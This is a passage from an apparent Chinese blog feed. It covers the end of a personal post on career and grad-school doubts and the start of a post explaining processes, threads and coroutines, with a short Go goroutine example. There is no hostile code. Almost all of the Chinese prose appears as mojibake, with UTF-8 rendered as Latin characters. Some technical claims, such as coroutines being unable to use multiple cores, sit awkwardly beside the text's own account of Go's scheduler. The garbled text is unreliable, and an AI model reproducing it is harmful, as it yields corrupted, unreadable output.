<p>æ¯å½“æˆ‘è¢«è¿™ä¸ªé—®é¢˜å›°æ‰°çš„æ—¶å€™ï¼Œéƒ½ä¼šæ„Ÿå¹ä¸€ä¸‹æ—¶é—´æµé€ä¹‹å¿«ã€‚è‡ªå·±å·²ç»ä¸èƒ½åƒå¤§ä¸€å¤§äºŒæ—¶é‚£æ ·ä»å®¹åœ°å»å­¦ä¸€äº›ä¸œè¥¿äº†ã€‚çœ‹äº†çœ‹è…¾è®¯çš„æ‹›è˜éœ€æ±‚ï¼Œåå°å¼€å‘æ— éæ˜¯ç†Ÿæ‚‰ Java/Python/C++ã€ç†Ÿæ‚‰è®¡ç®—æœºç½‘ç»œã€äº†è§£ OS å’Œå¸¸è§çš„æ•°æ®ç»“æ„åŠç®—æ³•ï¼Œæ­¤å¤–è¦ä¼š MySQLï¼Œè¿‘å¹´æ¥å¯¹ NoSQL ä¹Ÿåšäº†ä¸€å®šè¦æ±‚ï¼Œæœ€å¥½å†ä¼šäº›åˆ†å¸ƒå¼ç³»ç»Ÿè®¾è®¡ &amp;&amp; é«˜å¯ç”¨ã€‚è¿™é‡Œæœ‰äº›å†…å®¹æˆ‘äº†è§£è¿‡ï¼Œæœ‰äº›åˆ™æ²¡æœ‰ã€‚å½“ç„¶ï¼Œå¦‚æœä¸‹å†³å¿ƒå»å­¦çš„è¯è‚¯å®šæ˜¯èƒ½å­¦ä¼šçš„ã€‚</p>
<p>æƒ³åˆ°è¿™é‡Œå¿ƒé‡Œå µå¾—å¾ˆã€‚10 ç‚¹æ•´ï¼Œç»ˆäºè½®åˆ°æˆ‘äº†ï¼Œæ•´ä¸ªè¿‡ç¨‹æ„å¤–åœ°çŸ­ï¼Œåªç”¨äº†ä¸åˆ° 6 åˆ†é’Ÿï¼Œä¹Ÿä¸çŸ¥é“æ˜¯è€å¸ˆè‡ªå·±ä¹Ÿç´¯äº†è¿˜æ˜¯æˆ‘è¡¨ç°å¤ªå·®ï¼Œéš¾é“æ˜¯æˆ‘å›ç­”å¾—æ— æ‡ˆå¯å‡»å¯¼è‡´ä»–æ²¡å•¥èƒ½é—®çš„äº†ï¼Ÿæ€»ä¹‹è‡ªå·±ä¹Ÿæ²¡å¿ƒæƒ…æƒ³é‚£ä¹ˆå¤šï¼Œé¡ºæ‰‹æ‰“å¼€å‡ ä¸ªæœ‹å‹çš„åšå®¢ï¼Œå‘ç°ä»–ä»¬ä¹Ÿé¢ä¸´ç€è¿™æ ·é‚£æ ·çš„è‹¦æ¼ï¼Œæœ‰åç§‘ CS ç¡•å£«æ²¡æ‹¿åˆ°æ»¡æ„ offer çš„ï¼Œæœ‰æ­¥å…¥ç¤¾ä¼šæ„Ÿå¹å¤§å­¦æ—¶å…‰ä¸€å»ä¸å¤è¿”çš„ï¼Œè¿˜æœ‰å·¥ä½œä¹‹åå†ä¹Ÿæ²¡æ›´æ–°åšå®¢çš„ï¼ŒçœŸæ˜¯äººç”Ÿç™¾æ€ã€‚</p>
<h2 id="è´¨é—®ï¼šå‡†å¤‡å¥½äº†å—"><a href="#è´¨é—®ï¼šå‡†å¤‡å¥½äº†å—" class="headerlink" title="è´¨é—®ï¼šå‡†å¤‡å¥½äº†å—"></a>è´¨é—®ï¼šå‡†å¤‡å¥½äº†å—</h2><p>æœ¬è´¨ä¸Šï¼Œä»»ä½•äººéƒ½ä¸ä¼šæœ‰â€œå‡†å¤‡å¥½â€çš„æ—¶å€™ã€‚æ‰€è°“å‰‘æœªä½©å¦¥ï¼Œå‡ºé—¨å·²æ˜¯æ±Ÿæ¹–ã€‚ä½•å†µä»€ä¹ˆäº‹éƒ½ç­‰å‡†å¤‡ä¸‡å…¨å†è¡ŒåŠ¨ï¼Œé‚£é»„èŠ±èœéƒ½å‡‰äº†ã€‚åªæ˜¯æ­¤åˆ»æˆ‘æƒ³é—®è‡ªå·±ï¼Œ<strong>ä½ çœŸçš„å‡†å¤‡å¥½æˆä¸ºä¸€åç å†œäº†å—ï¼Ÿ</strong></p>
<p>è¯´å¾—å†ç°å®ä¸€ç‚¹ï¼Œä¸å¯å¦è®¤ï¼Œè™½ç„¶ä»Šå¤©äº’è”ç½‘è¡Œä¸šçš„è–ªèµ„è¿˜æ˜¯ä¼˜äºå…¶ä»–è¡Œä¸šï¼Œæ—©æœŸâ€œå…¥èŒ-æŒè‚¡-ä¸Šå¸‚åˆ†çº¢â€çš„æ¨¡å¼æ—©å·²ä¸å¤å­˜åœ¨ã€‚ä»¥å‰äººä»¬è¿˜ä¼šäº‰è®ºåº”å±Šç”Ÿåˆ°åº•æ˜¯å»å¤§å‚è¿˜æ˜¯å°å‚ï¼Œä»Šå¤©å°±ä¸ä¼šå†æœ‰è¿™ç§é—®é¢˜ï¼Œå› ä¸ºå¤§å®¶éƒ½æŠ¢ç ´å¤´äº†å¾€å¤§å‚æŒ¤ã€‚æ­£å¦‚ä¸€ä¸ªæœ‹å‹è¯´çš„ï¼š</p>
<blockquote>
<p>ä»å¦ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œåæ­£åœ¨è¿™ä¸ªå‰æ‰€æœªæœ‰çš„ä¼Ÿå¤§æ—¶ä»£ï¼Œä½ å¿«è¦é¥¿æ­»äº†å±…å§”ä¼šéƒ½ä¼šä¸Šé—¨ç»™ä½ é€ç±³é¢æ²¹ï¼Œäº’è”ç½‘è¡Œä¸šå¤šçš„é‚£ç‚¹é’±ä¹Ÿå¹²ä¸äº†ä»€ä¹ˆï¼Œå€Ÿå¤§å‚è‚¡ç¥¨æœŸæƒè´¢åŠ¡è‡ªç”±çš„æœºä¼šç°åœ¨ä¹Ÿæ²¡äº†ã€‚å¦‚æœä½ æœ‰çœŸå¿ƒå–œæ¬¢çš„å·¥ä½œï¼Œä¸å…¶åœ¨è¥¿äºŒæ——ä»¤äººçª’æ¯çš„ç©ºæ°”é‡Œ 996ï¼Œä¸å¦‚å›å»å¹²è‡ªå·±å–œæ¬¢çš„äº‹å§ã€‚</p>
</blockquote>
<p>æ‰€è°“åƒé‡‘éš¾ä¹°çˆ·ä¹æ„ï¼Œä½•å†µæˆ‘ä½œä¸ºä¸€åâ€œå¤±è´¥â€äººå£«ï¼Œå¯¹å‡å®˜å‘è´¢è¿™ç§äº‹å‘æ¥æ²¡ä»€ä¹ˆè¿½æ±‚ï¼Œåªè¦æˆ‘è¿‡çš„å¼€å¿ƒï¼Œæ‹¿åˆ°çš„å›æŠ¥è¶³å¤Ÿç§Ÿæˆ¿ç‚¹å¤–å–å°± okï¼Œå¦‚æœè¿˜èƒ½å‰©ä¸€ç‚¹ä¸‹æ¥ä»¥é˜²ä¸‡ä¸€é‚£å°±å†å¥½ä¸è¿‡ã€‚ç°åœ¨é—®é¢˜æ¥äº†ï¼Œä»€ä¹ˆå·¥ä½œç¬¦åˆè¿™ä¸ªæ¡ä»¶å‘¢ï¼Ÿåœ°è´¨æ˜¾ç„¶ä¸æ˜¯ï¼Œé‚£ä¹ˆæˆ‘è¯¥å»å†™ä»£ç å—ï¼Ÿå…¶å®æˆ‘è¿˜æ˜¯æŒºå–œæ¬¢ program çš„ï¼Œå°¤å…¶äº«å—äº²æ‰‹è§£å†³é—®é¢˜çš„è¿‡ç¨‹ã€‚è‡ªå·±çš„é€»è¾‘å’Œè®¾è®¡åŒ–èº«ä¸ºä¸€è¡Œè¡Œä»£ç åœ¨è®¡ç®—æœºä¸Šé£å¿«è¿è¡Œï¼Œè¿™ç§æ„Ÿè§‰çœŸæ˜¯å¦™ä¸å¯è¨€ã€‚ä¸åŒäºåº”è¯•æ•™è‚²ä¸‹åªæ˜¯ä¸ºäº†ä¸€ä¸ªæŠ½è±¡çš„åˆ†æ•°å»åšäº‹ï¼Œä»æ— åˆ°æœ‰çš„åˆ›é€ è¿™ä¸ªè¿‡ç¨‹è®©æˆ‘å¿«ä¹ã€‚ä½†è‡ªå·±å†™ç€ç©å’Œä»¥æ­¤è°‹ç”Ÿæ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ä»¶äº‹ã€‚åˆ°äº†å·¥ä½œé‡Œï¼Œè¿™ä»½ç®€å•çš„å¿«ä¹è¿˜ä¼šå­˜åœ¨å—ï¼Ÿ</p>
<p>å†è¯´è¯»ç ”ï¼Œæˆ–è®¸æ˜¯å› ä¸ºè‡ªå·±æ¯•ç«Ÿä¸æ˜¯æ­£å„¿å…«ç»çš„è®¡ç®—æœºç§‘ç­å‡ºèº«ï¼Œå¯¹è®¡ç®—æœºæ–¹å‘çš„ç§‘ç ”è¿™ä»¶äº‹å„¿ä¸€ç›´å¿ƒå­˜å‘å¾€ï¼Œæœ‰æ—¶å€™å°±ä¼šæƒ³è‡ªå·±èƒ½ä¸èƒ½åœ¨è¿™æ–¹é¢åšå‡ºç‚¹æˆç»©æ¥ã€‚åªæ˜¯å¦‚ä»Šè€ƒç ”å½¢åŠ¿ä¸€å¹´æ¯”ä¸€å¹´ä¸¥å³»ï¼Œè®¡ç®—æœºä½œä¸ºçƒ­é—¨ä¸“ä¸šæ›´æ˜¯ç‚™æ‰‹å¯çƒ­ï¼Œè‡ªå·±åˆ°åº•èƒ½å¦åœ¨å¦‚æ­¤æ¿€çƒˆçš„ç«äº‰ä¸­è„±é¢–è€Œå‡ºï¼Œå…¶å®å¿ƒé‡Œä¹Ÿæ²¡åº•ã€‚</p>
]]></content>
      <categories>
        <category>æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>é—²èŠ</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¹Ÿè¯´è¿›ç¨‹ã€çº¿ç¨‹ä¸åç¨‹</title>
    <url>/2020/03/02/%E4%B9%9F%E8%B0%88%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</url>
    <content><![CDATA[<p>CPU è¢«èª‰ä¸ºâ€œè®¡ç®—æœºçš„å¤§è„‘â€ï¼Œè¿™ä¸ªæ¯”å–»å¯ä»¥è¯´æ˜¯å¾ˆæ°å½“äº†ã€‚è®¡ç®—æœºæ— è®ºæ˜¯è¿›è¡Œ IO è¿˜æ˜¯è®¡ç®—éƒ½è¦åœ¨ CPU çš„æ§åˆ¶ä¸‹å®Œæˆã€‚å¦‚æ­¤ä¸€æ¥ï¼Œä¸€ä¸ªå¼ºå¤§çš„â€œå¤§è„‘â€å¯¹äºæ•´ä¸ªç³»ç»Ÿè€Œè¨€å°±æ˜¯éå¸¸é‡è¦çš„äº†ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æ€»èƒ½çœ‹åˆ°å‚å®¶ä¸æ–­åœ°å®£ä¼ è‡ªå·± CPU çš„ä¸»é¢‘æœ‰å¤šé«˜ï¼Œæ ¸å¿ƒæœ‰å¤šå¤§ã€‚</p>
<p>è¦æé«˜ CPU çš„æ€§èƒ½ï¼Œæœ€ç›´æ¥çš„æ–¹æ³•å½“ç„¶æ˜¯ä¸æ–­å¢å¼ºå•ä¸ªå¤„ç†å™¨çš„æ€§èƒ½ï¼Œè®©å¤„ç†å™¨é¢‘ç‡æ›´é«˜ã€‚å°±åƒè¦ä¸¾èµ·ä¸€å—çŸ³å¤´ï¼Œè®©è‡ªå·±å˜å¾—è¶³å¤Ÿå¼ºå£®å°±å¯ä»¥äº†ã€‚</p>
<p>ä½†æ˜¯è¿™ç§æ–¹æ³•å¾ˆå¿«å°±å—åˆ¶äºç‰©ç†å®šå¾‹ï¼šå½“å‰æŠ€æœ¯æ¡ä»¶ä¸‹æ— é™æé«˜é¢‘ç‡æ˜¯ä¸å¯èƒ½çš„ï¼Œè€Œä¸”è¿‡é«˜çš„é¢‘ç‡ä¹Ÿä¼šå¯¼è‡´å‘çƒ­é‡è¿‡å¤§ã€‚å› æ­¤ï¼Œå·¥ç¨‹å¸ˆä»¬åªå¥½é€€è€Œæ±‚å…¶æ¬¡ï¼Œè½¬è€Œå¢åŠ ä¸€ä¸ª CPU å†…çš„å¤„ç†å™¨æ•°é‡ã€‚è¿˜æ˜¯è¦ä¸¾èµ·çŸ³å¤´ï¼Œä¸€ä¸ªäººæ— è®ºå¦‚ä½•ä¹Ÿä¸¾ä¸èµ·æ¥ï¼Œé‚£å¤šå–Šå‡ ä¸ªå°å¼Ÿå¸®å¿™æ€»å¯ä»¥å§ï¼Ÿ</p>
<p>æœ‰äº†å¤šæ ¸ CPUï¼Œç¨‹åºå°±å¯ä»¥è¢«åˆ’åˆ†ä¸ºç›¸å¯¹ç‹¬ç«‹çš„å‡ ä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸€éƒ¨åˆ†è¿è¡Œåœ¨ä¸åŒçš„å¤„ç†å™¨ä¸Šã€‚å½“ç„¶ï¼Œè¿™æ ·åšä¹Ÿä¼šå¸¦æ¥é¢å¤–çš„å¼€é”€ã€‚å¦‚æœæ“ä½œç³»ç»Ÿå’Œç¨‹åºä¸èƒ½å¾ˆå¥½åœ°åè°ƒå¤šå¤„ç†å™¨ï¼Œé‚£ä¹ˆæ‰§è¡Œé€Ÿåº¦æœªå¿…å°±æœ‰æ˜æ˜¾æé«˜ï¼ˆä¹ƒè‡³é™ä½ä¹Ÿè¯´ä¸å®š~ï¼‰ã€‚</p>
<h2 id="è¿›ç¨‹"><a href="#è¿›ç¨‹" class="headerlink" title="è¿›ç¨‹"></a>è¿›ç¨‹</h2><p>ä¸‹é¢ç»™å‡ºè¿›ç¨‹çš„å®šä¹‰ï¼š</p>
<blockquote>
<p>è¿›ç¨‹æ˜¯å…·æœ‰ä¸€å®šç‹¬ç«‹åŠŸèƒ½çš„ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šçš„ä¸€æ¬¡åŠ¨æ€æ‰§è¡Œè¿‡ç¨‹</p>
</blockquote>
<p>è¿›ç¨‹æ˜¯æ“ä½œç³»ç»Ÿ<strong>åˆ†é…èµ„æº</strong>çš„æœ€å°å•ä½ï¼Œæ‹¥æœ‰ä»£ç æ–‡æœ¬ã€è¢«åˆ†é…çš„ç³»ç»Ÿèµ„æºã€ç‹¬ç«‹çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€å †æ ˆç©ºé—´ï¼š</p>
<p><img src="https://i.loli.net/2020/03/02/qz7MdhlxtQmK8pI.png" alt="è¿›ç¨‹å†…å­˜ç©ºé—´"></p>
<p>æ“ä½œç³»ç»Ÿä¸ºæ¯ä¸ªè¿›ç¨‹ç»´æŠ¤äº†ä¸€ä¸ªç¨‹åºæ§åˆ¶å—ï¼ˆPCB, Process Contral Blockï¼‰ï¼Œç”¨æ¥ä¿å­˜è¯¥è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ï¼ˆè¿›ç¨‹æ ‡è¯†ã€å¯„å­˜å™¨ã€æ‰“å¼€æ–‡ä»¶èµ„æºã€è°ƒåº¦ä¿¡æ¯ç­‰ï¼‰ã€‚PCB æ˜¯è¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡è¯†ã€‚</p>
<p><img src="https://i.loli.net/2021/01/20/Q2zIDlrHYA5sqv9.png" alt="image.png"></p>
<p>è¿›ç¨‹åœ¨æ•´ä¸ªç”Ÿå‘½å‘¨æœŸæœŸé—´å¤„äºä»¥ä¸‹äº”ä¸ªçŠ¶æ€ä¹‹ä¸€ï¼š</p>
<ul>
<li>NULL -&gt; åˆ›å»ºï¼šä¸€ä¸ªæ–°è¿›ç¨‹è¢«äº§ç”Ÿå‡ºæ¥æ‰§è¡Œä¸€ä¸ªç¨‹åº</li>
<li>åˆ›å»º -&gt; å°±ç»ªï¼šå½“è¿›ç¨‹è¢«åˆ›å»ºå®Œæˆå¹¶åˆå§‹åŒ–åï¼Œä¸€åˆ‡å°±ç»ªå‡†å¤‡è¿è¡Œæ—¶ï¼Œå˜ä¸ºå°±ç»ªçŠ¶æ€</li>
<li>å°±ç»ª -&gt; è¿è¡Œï¼šå¤„äºå°±ç»ªçŠ¶æ€çš„è¿›ç¨‹è¢«è¿›ç¨‹è°ƒåº¦ç¨‹åºé€‰ä¸­åï¼Œå°±åˆ†é…åˆ°å¤„ç†æœºä¸Šæ¥è¿è¡Œ</li>
<li>è¿è¡Œ -&gt; ç»“æŸï¼šå½“è¿›ç¨‹è¡¨ç¤ºå®ƒå·²ç»å®Œæˆæˆ–è€…å› å‡ºé”™ï¼Œå½“å‰è¿è¡Œè¿›ç¨‹ä¼šç”±æ“ä½œç³»ç»Ÿä½œç»“æŸå¤„ç†</li>
<li>è¿è¡Œ -&gt; å°±ç»ªï¼šå¤„äºè¿è¡ŒçŠ¶æ€çš„è¿›ç¨‹åœ¨å…¶è¿è¡Œè¿‡ç¨‹ä¸­ï¼Œç”±äºåˆ†é…ç»™å®ƒçš„å¤„ç†æœºæ—¶é—´ç‰‡ç”¨å®Œè€Œè®©å‡ºå¤„ç†æœº</li>
<li>è¿è¡Œ -&gt; ç­‰å¾…ï¼šå½“è¿›ç¨‹è¯·æ±‚æŸèµ„æºä¸”å¿…é¡»ç­‰å¾…æ—¶</li>
<li>ç­‰å¾… -&gt; å°±ç»ªï¼šå½“è¿›ç¨‹è¦ç­‰å¾…æŸäº‹ä»¶åˆ°æ¥æ—¶ï¼Œå®ƒä»é˜»å¡çŠ¶æ€å˜åˆ°å°±ç»ªçŠ¶æ€</li>
</ul>
<p><img src="https://i.loli.net/2020/03/02/dY1JoNBIRLCFE4G.png" alt="è¿›ç¨‹çŠ¶æ€"></p>
<h2 id="çº¿ç¨‹"><a href="#çº¿ç¨‹" class="headerlink" title="çº¿ç¨‹"></a>çº¿ç¨‹</h2><p>åœ¨å¾ˆæ—©çš„æ—¶å€™è®¡ç®—æœºå¹¶æ²¡æœ‰çº¿ç¨‹è¿™ä¸ªæ¦‚å¿µï¼Œä½†æ˜¯éšç€æ—¶ä»£çš„å‘å±•ï¼Œåªç”¨è¿›ç¨‹æ¥å¤„ç†ç¨‹åºå‡ºç°å¾ˆå¤šçš„ä¸è¶³ã€‚å¦‚å½“ä¸€ä¸ªè¿›ç¨‹å µå¡æ—¶ï¼Œæ•´ä¸ªç¨‹åºä¼šåœæ­¢åœ¨å µå¡å¤„ï¼Œå¹¶ä¸”å¦‚æœé¢‘ç¹çš„åˆ‡æ¢è¿›ç¨‹ï¼Œä¼šæµªè´¹ç³»ç»Ÿèµ„æºã€‚æ‰€ä»¥çº¿ç¨‹å‡ºç°äº†ã€‚ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼ŒåŒå±ä¸€ä¸ªè¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹ä¼šå…±äº«è¯¥è¿›ç¨‹çš„å†…å­˜åœ°å€ç©ºé—´ã€æ‰“å¼€æ–‡ä»¶ã€ä»£ç æ®µã€å…¨å±€æ•°æ®æ®µã€‚</p>
<p>çº¿ç¨‹æ˜¯è¿›ç¨‹çš„ä¸€éƒ¨åˆ†ï¼Œæè¿°ä¸€æ®µæŒ‡ä»¤æµçš„æ‰§è¡ŒçŠ¶æ€ï¼Œæ˜¯ç³»ç»Ÿ<strong>è°ƒåº¦</strong>çš„åŸºæœ¬å•ä½ã€‚æ¯ä¸ªçº¿ç¨‹æ‹¥æœ‰è‡ªå·±çš„çº¿ç¨‹æ§åˆ¶å—ï¼ˆTCB, Thread Contral Blockï¼‰ï¼Œä¿å­˜äº†çº¿ç¨‹æ ‡è¯†ã€ä»å±è¿›ç¨‹ã€å¯„å­˜å™¨çŠ¶æ€ç­‰ä¿¡æ¯ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç¨‹åºè®¡æ•°å™¨ï¼ˆè®°å½•è¦æ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰ï¼Œä¸€ç»„å¯„å­˜å™¨ï¼ˆä¿å­˜å½“å‰çº¿ç¨‹çš„å·¥ä½œå˜é‡ï¼‰ï¼Œå †æ ˆï¼ˆè®°å½•æ‰§è¡Œå†å²ï¼‰ã€‚</p>
<p><img src="https://i.loli.net/2020/03/02/P6MXJ5WHtQNp4x1.png" alt="çº¿ç¨‹å†…å­˜ç©ºé—´"></p>
<p>å¦‚å‰é¢æ‰€è¨€ï¼Œç¨‹åºè¢«åˆ’åˆ†ä¸ºå‡ éƒ¨åˆ†è·‘åœ¨ä¸åŒå¤„ç†å™¨ä¸Šï¼Œè¿™äº›è¢«åˆ’åˆ†å‡ºæ¥çš„â€œéƒ¨åˆ†â€å°±å¯ä»¥çœ‹åšä¸€ä¸ªä¸ªçš„çº¿ç¨‹ã€‚</p>
<h2 id="è¿›ç¨‹ä¸çº¿ç¨‹çš„å¼‚åŒ"><a href="#è¿›ç¨‹ä¸çº¿ç¨‹çš„å¼‚åŒ" class="headerlink" title="è¿›ç¨‹ä¸çº¿ç¨‹çš„å¼‚åŒ"></a>è¿›ç¨‹ä¸çº¿ç¨‹çš„å¼‚åŒ</h2><p>è¿›ç¨‹å’Œçº¿ç¨‹çš„åˆ‡æ¢æ˜¯ OS é€šè¿‡è°ƒåº¦ç®—æ³•ï¼Œä¿å­˜å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åä»ä¸Šæ¬¡æš‚åœçš„åœ°æ–¹å†æ¬¡å¼€å§‹è®¡ç®—ã€‚æ¯æ¬¡ CPU è®¡ç®—çš„æŒ‡ä»¤æ•°é‡å’Œä»£ç è·‘è¿‡çš„ CPU æ—¶é—´æ˜¯ç›¸å…³çš„ï¼Œè·‘æ»¡ OS åˆ†é…çš„æ—¶é—´ç‰‡åå°±ä¼šè¢«å¼ºåˆ¶æŒ‚èµ·ï¼Œå¼€å‘è€…æ— æ³•ç²¾ç¡®çš„æ§åˆ¶å®ƒä»¬ã€‚</p>
<ul>
<li>åœ°å€ç©ºé—´ï¼š<strong>åŒä¸€è¿›ç¨‹çš„çº¿ç¨‹å…±äº«æœ¬è¿›ç¨‹çš„åœ°å€ç©ºé—´</strong>ï¼Œè€Œè¿›ç¨‹ä¹‹é—´åˆ™æ˜¯ç‹¬ç«‹çš„åœ°å€ç©ºé—´</li>
<li>èµ„æºåˆ†é…ï¼š<strong>åŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«æœ¬è¿›ç¨‹çš„èµ„æºå¦‚å…¨å±€æ•°æ®ã€æ‰“å¼€æ–‡ä»¶ã€CPU</strong>ç­‰ï¼Œä½†æ˜¯è¿›ç¨‹ä¹‹é—´çš„èµ„æºæ˜¯ç‹¬ç«‹çš„</li>
<li>ç¨‹åºå…¥å£ï¼šæ¯ä¸ªç‹¬ç«‹çš„è¿›ç¨‹æœ‰ä¸€ä¸ªç¨‹åºè¿è¡Œçš„å…¥å£ã€é¡ºåºæ‰§è¡Œåºåˆ—å’Œç¨‹åºçš„å‡ºå£ã€‚è€Œçº¿ç¨‹ä¸èƒ½å¤Ÿç‹¬ç«‹æ‰§è¡Œï¼Œå¿…é¡»ä¾å­˜åœ¨è¿›ç¨‹ä¸­ï¼Œç”±è¿›ç¨‹å¯¹å¤šä¸ªçº¿ç¨‹æ‰§è¡Œæ§åˆ¶ã€‚</li>
<li>å¥å£®æ€§ï¼šä¸€ä¸ªè¿›ç¨‹å´©æºƒåï¼Œåœ¨ä¿æŠ¤æ¨¡å¼ä¸‹ä¸ä¼šå¯¹å…¶ä»–è¿›ç¨‹äº§ç”Ÿå½±å“ï¼Œä½†æ˜¯ä¸€ä¸ªçº¿ç¨‹å´©æºƒæ•´ä¸ªè¿›ç¨‹éƒ½æ­»æ‰ã€‚æ‰€ä»¥å¤šè¿›ç¨‹è¦æ¯”å¤šçº¿ç¨‹å¥å£®</li>
</ul>
<h2 id="åç¨‹"><a href="#åç¨‹" class="headerlink" title="åç¨‹"></a>åç¨‹</h2><p><strong>åç¨‹æ˜¯ç¼–è¯‘å™¨çº§çš„ï¼Œè¿›ç¨‹æ˜¯å’Œçº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿçº§çš„</strong>ã€‚</p>
<p>åç¨‹ï¼ˆCoroutineï¼‰æ˜¯æ¯”çº¿ç¨‹æ›´è½»é‡çº§çš„å­˜åœ¨ï¼Œå¯ä»¥è¯´æ˜¯ä¸€ç§<strong>ç”¨æˆ·æ€çº¿ç¨‹</strong>ã€‚å®ƒæ›´åƒæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œåªæ˜¯è¿™ä¸ªå‡½æ•°å¯ä»¥åƒçº¿ç¨‹é‚£æ ·ä¸­é€”è®©å‡ºæ‰§è¡Œæƒï¼Œæ»¡è¶³æŸç§æ¡ä»¶ååˆä»ç­‰å¾…çš„åœ°æ–¹ç»§ç»­è¿è¡Œã€‚</p>
<p>åç¨‹çš„<strong>åˆ‡æ¢ç­–ç•¥ä»…ç”±ç”¨æˆ·æ€æ§åˆ¶</strong>ï¼Œå¯¹äºæ“ä½œç³»ç»Ÿæ˜¯é€æ˜çš„ï¼Œæ‰€ä»¥åç¨‹é—´çš„åˆ‡æ¢éå¸¸å¿«ã€‚ä½†è¿™ä¹Ÿå¯¼è‡´åç¨‹æ— æ³•å……åˆ†åˆ©ç”¨å¤šæ ¸ CPUï¼Œå› ä¸ºåç¨‹å†å¤šï¼Œåœ¨æ“ä½œç³»ç»Ÿçœ¼é‡Œä¹Ÿåªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œç½¢äº†ã€‚</p>
<p><img src="https://i.loli.net/2020/03/02/X3jbaStuZRByIdw.png" alt="åç¨‹"></p>
<p>Go çš„è°ƒåº¦å™¨ä½¿ç”¨ m:n è°ƒåº¦ï¼Œå…¶ä¸­ m æ˜¯ goroutine æ•°ï¼Œn æ˜¯æ´»è·ƒçº¿ç¨‹æ•°ï¼ˆç”± GOMAXPROCS å†³å®šï¼Œé»˜è®¤ç­‰äºå¤„ç†å™¨æ ¸å¿ƒæ•°ï¼‰ã€‚å½“ä¸€ä¸ª goroutine é™·å…¥ä¼‘çœ æˆ–é˜»å¡åœ¨ä¸€æ¬¡ç®¡é“é€šä¿¡ä¸Šï¼Œè°ƒåº¦å™¨ä¼šæŠŠå®ƒçš„çŠ¶æ€è®¾ä¸º <code>_Gwaiting</code> å¹¶è§£é™¤å®ƒä¸çº¿ç¨‹çš„ç»‘å®šï¼ˆç›¸å½“äºè®©å‡ºçº¿ç¨‹ï¼Œéšåå°±å¯ä»¥æ‰§è¡Œä¸€æ¬¡ goroutine è°ƒåº¦ï¼‰ï¼Œç­‰å¾…çŠ¶æ€çš„ goroutine ä¸å ç”¨çº¿ç¨‹ï¼›è€Œå¦‚æœ goroutine é˜»å¡åœ¨ä¸€æ¬¡ IO æˆ–å…¶å®ƒç³»ç»Ÿè°ƒç”¨ä¸Šè°ƒåº¦å™¨ä¼šæ›´æ–° goroutine çŠ¶æ€ä¸º <code>_Gsyscall</code> å¹¶è§£é™¤çº¿ç¨‹å’Œå¤„ç†å™¨çš„ç»‘å®šï¼ˆç›¸å½“äºè®©å‡ºå¤„ç†å™¨ï¼Œè¿™æ ·å¤„ç†å™¨å°±å¯ä»¥ç»‘å®šåˆ°å…¶å®ƒçº¿ç¨‹ä¸Šã€‚è¿™ä¸ªè¿‡ç¨‹è§¦å‘ä¸€æ¬¡çº¿ç¨‹åˆ‡æ¢çš„ç³»ç»Ÿè°ƒç”¨ï¼‰ã€‚</p>
<p>ä»¥ go ä¸ºä¾‹ï¼Œåœ¨ä¸€ä¸ªçº¿ç¨‹é‡Œé¢å¼€å¯å¤šä¸ªåç¨‹ï¼š</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg = sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;    <span class="comment">// å¼€å¯ä¸€ä¸ªæ–°çš„åç¨‹</span></span><br><span class="line">            <span class="keyword">defer</span> wg.Done()</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%v: Hello World!\n&quot;</span>, n)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åç¨‹çš„ä¼˜ç‚¹ï¼š</p>
<ol>
<li>åˆ›å»ºæˆæœ¬ä½ã€‚åœ¨ go é‡Œæ¯ä¸ªåç¨‹å¤§çº¦åªå ç”¨ 1k çš„å†…å­˜ã€‚</li>
<li>è°ƒåº¦æˆæœ¬ä½ã€‚åç¨‹å±äºç”¨æˆ·æ€ï¼Œä¸éœ€è¦ç»è¿‡æ“ä½œç³»ç»Ÿç®¡ç†ï¼Œè°ƒåº¦æ—¶<strong>ä¸éœ€è¦é™·å…¥å†…æ ¸</strong>ã€‚</li>
